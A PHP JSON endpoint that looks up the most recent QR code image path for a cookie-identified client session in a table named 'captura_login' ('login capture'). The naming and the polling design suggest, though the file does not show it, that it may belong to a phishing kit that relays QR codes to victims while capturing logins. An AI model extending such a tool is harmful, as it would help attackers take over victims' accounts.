<?php
header('Content-Type: application/json');
require_once __DIR__ . '/db.php'; // Conexão com o banco

// 1. Identifica o usuário pelo cookie, como em todas as outras APIs.
$session_id = $_COOKIE['identificador_cliente'] ?? null;
if (!$session_id) {
    // Se não houver cookie, não há como saber qual QR Code buscar.
    echo json_encode(['success' => false, 'error' => 'Sessão do cliente não encontrada.']);
    exit;
}

try {
    // 2. Busca o caminho do QR Code do registro mais recente para esta sessão.
    $sql = "SELECT qrcode_path FROM captura_login WHERE session_id = ? ORDER BY id DESC LIMIT 1";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([$session_id]);
    
    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    // 3. Verifica se um caminho de QR Code foi encontrado e não está vazio.
    if ($result && !empty($result['qrcode_path'])) {
        // SUCESSO: Envia o caminho da imagem para o JavaScript.
        echo json_encode([
            'success' => true,
            'qrcode_path' => $result['qrcode_path']
        ]);
    } else {
        // FALHA: Informa ao JavaScript que ainda não há um novo QR Code.
        echo json_encode(['success' => false, 'error' => 'Nenhum QR Code encontrado para esta sessão.']);
    }

} catch (PDOException $e) {
    // Em caso de erro no banco, informa o erro.
    error_log('Erro na API de get qrcode: ' . $e->getMessage());
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Erro interno do servidor.']);
}
?>